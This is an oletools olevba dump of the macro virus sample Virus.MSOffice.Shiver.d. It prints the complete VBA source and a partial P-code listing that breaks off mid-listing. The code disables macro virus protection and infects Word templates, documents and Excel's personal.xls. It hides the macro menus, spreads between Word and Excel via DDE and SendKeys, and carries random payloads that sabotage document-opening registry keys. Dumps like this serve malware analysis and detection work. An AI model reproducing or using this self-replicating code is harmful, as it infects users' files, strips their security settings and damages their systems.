olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Shiver.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Shiver.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSOffice.Shiver.d - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long

Public ExcelFound, WordFound, Marker As Boolean

Sub AutoExec()
On Error Resume Next
Call WordStealth
If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then
Documents.Add Template:="", NewTemplate:=False
Open "c:\sentry.sys" For Output As 1
Print #1, "Attribute VB_Name = ""Sentry"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""Module1"").Name <> ""Module1"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\shiver.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1
ActiveDocument.VBProject.VBComponents.Import "c:\sentry.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
End Sub

Sub AutoOpen()

Dim Set1 As Long

On Error Resume Next

Call wdTrigger

Set1 = &H0

Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = Set1

Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

AI = True
NI = True

If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then NI = False
If ActiveDocument.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then AI = False

Call WordStealth

If NI = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys"
End If

If AI = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\shiver.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Sub WordStealth()
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

Sub AutoExit()

On Error GoTo out

Call CheckMarker

hWnd = FindApp("XLMain")

If hWnd <> 0 Then ExcelFound = True

If ExcelFound = False And Marker = False Then

Application.WindowState = wdWindowStateMinimize

Call PersonalFun
Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus
Do While ExcelFound = False
    Call FindExcel
Loop

Application.DDETerminateAll

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[New(4)]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "Macro1")
Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"
DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"
Application.DDETerminate CNL

Call MakeMarker

End If

out:

End Sub

Sub FindExcel()
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

Function FindApp(ByVal varClassName As Variant) As Long
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function


Sub PersonalFun()
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(Application.Path + "\xlstart\personal.xls")
If UCase("personal.xls") = UCase(PS) Then
Kill PSLIVE
End If
End Sub

Sub CheckMarker()
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

Sub MakeMarker()
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

Sub PXL_Done()
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

Sub Auto_Open()
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()

On Error Resume Next

Call xlTrigger

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If

out:

End Sub

Sub wdTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If Int(Rnd * 800) = 601 Then
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec", "") = "[FileExit]"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec", "") = "[FileExit]"
End If
End Sub

Sub xlTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub


Sub Auto_Close()

On Error GoTo out

Call CheckMarker

hWnd = FindApp("OpusApp")

If hWnd <> 0 Then WordFound = True

If WordFound = False And Marker = False Then

Shell Application.Path & "\winword.exe", vbMinimizedFocus
CNL = Application.DDEInitiate("MSWord", "system")
Application.DDEExecute CNL, "[fileclose]"
Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"
Application.DDEExecute CNL, "[Sendkeys ""^m""]"
Call delay
SendKeys "c:\shiver.sys", Wait
SendKeys "%o"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"
Application.DDETerminate CNL

Call MakeMarker

End If

out:

End Sub

Sub delay()
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Shiver.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 19635 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Declare Function FindWindow Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As ) As Long)
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn ExcelFound
' 	VarDefn WordFound
' 	VarDefn Marker (As Boolean)
' Line #4:
' Line #5:
' 	FuncDefn (Sub AutoExec())
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	ArgsCall (Call) WordStealth 0x0000 
' Line #8:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #10:
' 	LitStr 0x000D "c:\sentry.sys"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Attribute VB_Name = "Sentry""
' 	PrintItemNL 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys""
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #20:
' 	LitStr 0x000D "c:\sentry.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #21:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #22:
' 	LitStr 0x0009 "Word8.dot"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Sub AutoOpen())
' Line #27:
' Line #28:
' 	Dim 
' 	VarDefn Set1 (As Long)
' Line #29:
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' Line #32:
' 	ArgsCall (Call) wdTrigger 0x0000 
' Line #33:
' Line #34:
' 	LitHI2 0x0000 
' 	St Set1 
' Line #35:
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #37:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #38:
' Line #39:
' 	Ld Set1 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #40:
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #43:
' Line #44:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #45:
' Line #46:
' 	LitVarSpecial (True)
' 	St AI 
' Line #47:
' 	LitVarSpecial (True)
' 	St NI 
' Line #48:
' Line #49:
' 	LitStr 0x0007 "Module1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NI 
' 	EndIf 
' Line #50:
' 	LitStr 0x0007 "Module1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St AI 
' 	EndIf 
' Line #51:
' Line #52:
' 	ArgsCall (Call) WordStealth 0x0000 
' Line #53:
' Line #54:
' 	Ld NI 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #55:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	Ld AI 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub WordStealth())
' Line #66:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Yin 
' Line #67:
' 	Ld Yin 
' 	LitDI2 0x0004 
' 	Lt 
' 	IfBlock 
' Line #68:
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub AutoExit())
' Line #73:
' Line #74:
' 	OnError out 
' Line #75:
' Line #76:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #77:
' Line #78:
' 	LitStr 0x0006 "XLMain"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #79:
' Line #80:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ExcelFound 
' 	EndIf 
' Line #81:
' Line #82:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #83:
' Line #84:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #85:
' Line #86:
' 	ArgsCall (Call) PersonalFun 0x0000 
' Line #87:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000A "\Excel.exe"
' 	Add 
' 	Paren 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #88:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	DoWhile 
' Line #89:
' 	ArgsCall (Call) FindExcel 0x0000 
' Line #90:
' 	Loop 
' Line #91:
' Line #92:
' 	Ld Application 
' 	ArgsMemCall DDETerminateAll 0x0000 
' Line #93:
' Line #94:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #95:
' 	Ld CNL 
' 	LitStr 0x0008 "[New(4)]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #96:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #97:
' Line #98:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "Macro1"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #99:
' 	Ld CNL 
' 	LitStr 0x0004 "R1C1"
' 	ParamNamed Item 
' 	LitStr 0x0021 "=VBA.INSERT.FILE("c:\shiver.sys")"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #100:
' 	Ld CNL 
' 	LitStr 0x0004 "R2C1"
' 	ParamNamed Item 
' 	LitStr 0x000A "=SAVE.AS(""
' 	Ld Application 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0017 "\xlstart\personal.xls")"
' 	Concat 
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #101:
' 	Ld CNL 
' 	LitStr 0x0004 "R3C1"
' 	ParamNamed Item 
' 	LitStr 0x0009 "=Return()"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #102:
' 	Ld CNL 
' 	ParamNamed channel 
' 	LitStr 0x000D "[Run("R1C1")]"
' 	ParamNamed Command 
' 	ArgsCall DDEExecute 0x0002 
' Line #103:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #104:
' Line #105:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #106:
' 	Ld CNL 
' 	LitStr 0x001E "[RUN("Personal.xls!PXL_Done")]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #107:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #108:
' Line #109:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #110:
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' 	Label out 
' Line #114:
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Sub FindExcel())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #120:
' 	Ld x 
' 	Ld Tasks 
' 	ArgsMemLd Item 0x0001 
' 	St w 
' Line #121:
' 	Ld w 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #122:
' 	LitVarSpecial (True)
' 	St ExcelFound 
' Line #123:
' 	ExitSub 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' 	FuncDefn (Function FindApp(ByVal varClassName As Variant) As Long)
' Line #129:
' 	Ld varClassName 
' 	ArgsLd IsNull 0x0001 
' 	IfBlock 
' Line #130:
' 	LitDI2 0x0000 
' 	St FindApp 
' Line #131:
' 	ElseBlock 
' Line #132:
' 	Ld varClassName 
' 	Coerce (Str) 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd FindWindow 0x0002 
' 	St FindApp 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	EndFunc 
' Line #135:
' Line #136:
' Line #137:
' 	FuncDefn (Sub PersonalFun())
' Line #138:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	St PSLIVE 
' Line #139:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St PS 
' Line #140:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd UCase 0x0001 
' 	Ld PS 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #141:
' 	Ld PSLIVE 
' 	ArgsCall Kill 0x0001 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	EndSub 
' Line #144:
' Line #145:
' 	FuncDefn (Sub CheckMarker())
' Line #146:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #147:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St mkr 
' Line #148:
' 	ElseBlock 
' Line #149:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	ArgsLd GetSetting 0x0003 
' 	St mkr 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	Ld mkr 
' 	LitStr 0x0007 "ALT-F11"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Marker 
' 	EndIf 
' Line #152:
' 	EndSub 
' Line #153:
' Line #154:
' 	FuncDefn (Sub MakeMarker())
' Line #155:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #156:
' 	LitStr 0x0007 "ALT-F11"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #157:
' 	ElseBlock 
' Line #158:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0007 "ALT-F11"
' 	ArgsCall SaveSetting 0x0004 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	EndSub 
' Line #161:
' Line #162:
' 	FuncDefn (Sub PXL_Done())
' Line #163:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #164:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #165:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub Auto_Open())
' Line #169:
' 	LitStr 0x000A "ShiverTime"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #170:
' 	EndSub 
' Line #171:
' Line #172:
' 	FuncDefn (Sub ShiverTime())
' Line #173:
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' Line #176:
' 	ArgsCall (Call) xlTrigger 0x0000 
' Line #177:
' Line #178:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "BOOK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	BoS 0x0000 
' 	EndIf 
' Line #179:
' Line #180:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #181:
' Line #182:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #183:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #184:
' Line #185:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #186:
' Line #187:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #188:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SXLS 
' 	EndIf 
' Line #189:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #190:
' Line #191:
' 	Ld SXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #192:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #193:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #194:
' 	EndIfBlock 
' Line #195:
' Line #196:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #197:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #198:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #199:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #200:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #201:
' 	EndIfBlock 
' Line #202:
' Line #203:
' 	Label out 
' Line #204:
' Line #205:
' 	EndSub 
' Line #206:
' Line #207:
' 	FuncDefn (Sub wdTrigger())
' Line #208:
' 	OnError (Resume Next) 
' Line #209:
' 	ArgsCall Read 0x0000 
' Line #210:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #211:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #212:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #213:
' 	LitStr 0x000A "[FileExit]"
' 	LitStr 0x0000 ""
' 	LitStr 0x0034 "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #214:
' 	LitStr 0x000A "[FileExit]"
' 	LitStr 0x0000 ""
' 	LitStr 0x0032 "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec"
